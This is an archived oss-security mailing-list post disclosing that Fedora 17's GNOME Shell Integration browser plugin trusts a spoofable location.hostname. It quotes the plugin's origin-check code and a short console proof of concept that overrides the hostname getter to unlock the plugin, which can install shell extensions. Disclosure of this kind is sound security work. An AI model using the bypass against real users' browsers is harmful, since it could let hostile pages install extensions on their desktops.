[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_88771c4b_20250125_023423.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2012/09/07/16) [[next>]](../../../2012/09/09/1) [[thread-next>]](../../../2012/09/09/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <mpro.ma1ysf01zd0kg050u.taviso@cmpxchg8b.com>
Date: Sun, 9 Sep 2012 00:36:26 +0200
From: Tavis Ormandy <taviso@...xchg8b.com>
To: oss-security@...ts.openwall.com
Subject: note on gnome shell extensions

List, I just installed Fedora 17 on a workstation. While researching how to
upgrade gnome 3 to version 2, I noticed it installed a browser extension
called "Gnome Shell Integration".

$ rpm -qf /usr/lib64/mozilla/plugins/libgnome-shell-browser-plugin.so
gnome-shell-3.4.1-5.fc17.x86_64

The NPPVpluginDescriptionString states "It can be used only by
extensions.gnome.org", but I happen to know that is a tricky thing to get
right.

102   if (!funcs.getproperty (instance, NPVARIANT_TO_OBJECT (document),
103                           funcs.getstringidentifier ("location"),
104                           &location))
105     goto out;
106
107   if (!NPVARIANT_IS_OBJECT (location))
108     goto out;
109
110   hostname = get_string_property (instance,
111                                   NPVARIANT_TO_OBJECT (location),
112                                   "hostname");
113
114   if (g_strcmp0 (hostname, ORIGIN))
115     {
116       g_debug ("origin does not match, is %s",
117                hostname);
118
119       goto out;
120     }

I'm familiar with this topic as I wrote a tool for managing broken but
necessary plugins by restricting them to trusted domains.

<http://code.google.com/p/nssecurity>

As far as I know, browsers only attempt to prevent tampering with
document.location.href, anything else can be modified. For example, this
works in Chrome, I don't know the syntax for Mozilla:

> location.__defineGetter__("hostname", function () { return "arbitrary"; })
  undefined
> location.hostname
  "arbitrary"

However,

> location.__defineGetter__("href", function () { return "arbitrary"; })
  undefined
> location.href
  "<http://realurl.test/asdasd>"

So this should fail:

> o = document.createElement('OBJECT')
  <object>?</object>?
> o.setAttribute('TYPE', 'application/x-gnome-shell-integration')
  undefined
> document.body.appendChild(o)
  <object type=?"application/?x-gnome-shell-integration">?</object>?
> o.shellVersion
  undefined

But we can re-insert it and make it work:

> document.body.removeChild(o)
  <object type=?"application/?x-gnome-shell-integration">?</object>?
> location.__defineGetter__("hostname", function () { return
"extensions.gnome.org"; })
  undefined
> document.body.appendChild(o)
  <object type=?"application/?x-gnome-shell-integration">?</object>?
> o.shellVersion
  "3.4.1"
> document.location.href
  "<https://www.redhat.com/>"

The plugin incorrectly trusted hostname, and initialized. As far as I can
tell, the plugin will let you install new shell extensions, I don't know
what the impact of that is, can they contain native code?

Tavis.

--
-------------------------------------
taviso@...xchg8b.com | pgp encrypted mail preferred
-------------------------------------------------------

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


